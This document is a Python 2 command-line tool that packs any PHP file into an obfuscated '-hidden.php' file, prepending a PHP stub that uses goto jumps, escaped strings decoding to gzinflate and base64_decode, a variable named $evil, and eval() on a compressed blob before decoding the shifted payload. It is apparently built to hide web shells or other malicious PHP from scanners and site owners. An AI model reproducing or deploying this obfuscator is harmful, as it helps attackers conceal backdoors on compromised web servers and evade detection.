#!/usr/bin/env python
import os
import sys
import base64
import argparse


str_decryptor = '<?php /* Mr-Gandrunx - Hiddenymouz */ error_reporting(0); define("__LOCALFILE__",__FILE__); goto RSA; TWOFISH: extract($TripleDES); goto AES; RSA: $TripleDES["\\x69\\x73"] = "\\147\\172\\x69\\x6e\\146\\x6c\\x61\\x74\\145"; goto BLOWFISH; BLOWFISH: $TripleDES["\\x65\\x76\\151\\x6c"] = "\\x62\\141\\163\\x65\\66\\x34\\x5f\\144\\145\\143\\x6f\\x64\\145"; goto TWOFISH; AES: eval($is($evil("nVTrcppAGH2VDL1Bm2bUqGmGiNiEznSaaNQuRkAoK7utU8siYtxATKeRljx2F0LQ6eVHu7oD3+Wc881ZAPk+8S0fecQPJu5HviSIjzulTrYaiHpT4iCee8Tt4skU8Z6PPqbNU3vMsrLB7z1P92OZ2+W4Xcs67Ry3Tt+8PVUsSxD0Ei1la5Rx3q8GXrjjYEJc/iHVEaL09l6R40RM/PtalnjgEIvU0Tzwp2gbv6m9eCFEE7yBP8nhlUZBtKW21xh/8nniOxsuvYCOhJc55FgQV2g6R/8MVBhw5aNg4bs7BVZcZQbnP50zyuUDo17K/3R/+45W8cPmRo3Cw18Isg7WnRNtXbY4GJ5JVSsGrZeNcn2fXWusXme7atAaZrUq2yzHauUaw9azmBMRDXx7HPBbooLITGbHMPHInC8el8157256O4VFaRfPGa32inTP4sGybZBlQ0WodUWu4XrWPbsF/eAGAzN0r+mt24InoBvFAMCEREritNSQACXxAF3jZP59AL8uMIDRF9QKB101cKTYHEk93byiuukoAVjGLIcvPvRh4CRLBQAv9sDJwg61cz1pj6GkAMvRBvqyHc5UM0FIkwZdc0wi+t0FsG86wxvWd+22zBj0e+/tu6/32OXZFVTVGwLi0OxDOE7U2ayHjh113homqg96RwsQrn9oPW82hCRheVl34tdaBFk8ktMYNVlMewxHJKfXlTQbFPONrmITsrltaa6Avqp/aHr5nH/Ubaa6WqoHUz5MQXi0MOyzZaozzOboMV10l8aas5a1MH49vDNZL4wy7fdpTzZb1oPDdDYzjZuAMo9lRXK3/Ura58ybE3YuMkLrlQroHfMt9CL6bdB5+44TBGHn6dOd/3s6BvYydT1w5ODSVc0AycotAfQbxmDFTjxjF6L8lUKX9pTnmhK391fC39TLI0aQv84LdzpxP/OWlX+wxCKx/RkTnQnin11YF88EkR6U0EHFriG0jzE+LNUOYal+eFgdOxXnVaVW3hdXPwE="))); __halt_compiler();#'

def fn_decrypt(fname):
    with open(fname, 'rb') as fp:
        s = fp.read()

    try:
        a = s.split('#')[1]
        print base64.b64decode(''.join(chr(ord(a[i]) - (0x0c if ((i % 2) == 0) else 0x0e)) for i in range(len(a))))
    except:
        print '[-] error: invalid data!'


def fn_encrypt(fname):
    with open(fname, 'r') as fp:
        s = base64.b64encode(fp.read())

    fnew = os.path.splitext(os.path.basename(fname))[0]

    with open(fnew + '-hidden.php', 'wb') as fp:
        fp.write(str_decryptor + ''.join(chr(ord(s[i]) + (0x0c if ((i % 2) == 0) else 0x0e)) for i in range(len(s))))

    print '[+] encoded file: {}-hidden.php'.format(fnew)


def parse_cmd():
    p = argparse.ArgumentParser()
    p.add_argument('-f', '--file', dest='filename', help='Input filename')
    g = p.add_mutually_exclusive_group(required=True)
    g.add_argument('-e', '--encode', action='store_true', dest='e')
    g.add_argument('-d', '--decode', action='store_true', dest='d')
    a = p.parse_args()

    if a.e and a.filename:
        fn_encrypt(a.filename)
    elif a.d and a.filename:
        fn_decrypt(a.filename)
    else:
        sys.exit()

if __name__ == '__main__':
    parse_cmd()
